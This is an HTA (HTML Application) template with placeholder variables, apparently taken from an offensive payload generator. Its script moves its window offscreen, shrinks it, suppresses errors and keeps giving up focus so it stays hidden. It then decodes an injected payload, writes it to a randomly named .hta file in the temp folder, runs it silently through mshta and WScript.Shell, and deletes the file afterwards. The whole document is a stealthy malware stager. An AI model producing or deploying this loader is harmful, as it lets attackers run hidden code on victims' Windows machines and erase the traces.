<html>
 <head>
 <script language="JScript">

 try
 {
     window.moveTo(-1000, -2000);
     window.blur();
     window.resizeTo(2, 4);
     window.onerror = function(sMsg, sUrl, sLine) { return false; }
     window.onfocus = function() { window.blur(); }
     var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}}
     var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}}
     var {{variables['tmp'][0]}} = {{variables['tmp'][1]}}
     var mshta = unescape("{{code}}")
 }
 catch (e){kill()}

function kill() {
  try {
    window.close();
  }
  catch(e){}
  try {
    window.self.close();
  }
  catch (e){}
  try {
    window.top.close();
  }
  catch (e){}
  try {
    self.close();
  }
  catch (e){}
}

function main(){
  try {
    var path = {{variables['tmp'][0]}} + "\\" + "{{variables['random_str']}}" + ".hta";
    var fd = {{variables['file-system-object'][0]}}.CreateTextFile(path);
    fd.WriteLine(mshta);
    fd.close();
    {{variables['wscript.shell'][0]}}.run("mshta " + path, 0, false)
    var now = new Date().getTime();
    while((new Date().getTime() - now) < 5000){
      // do nothing
    }
    {{variables['file-system-object'][0]}}.DeleteFile(path);
    kill()
  } catch (e) {kill()}
}

main()
 </script>
 <hta:application caption="no" windowtate="minimize" showInTaskBar="no" scroll="no" navigable="no" />
 </head>
 <body>
 </body>
</html>
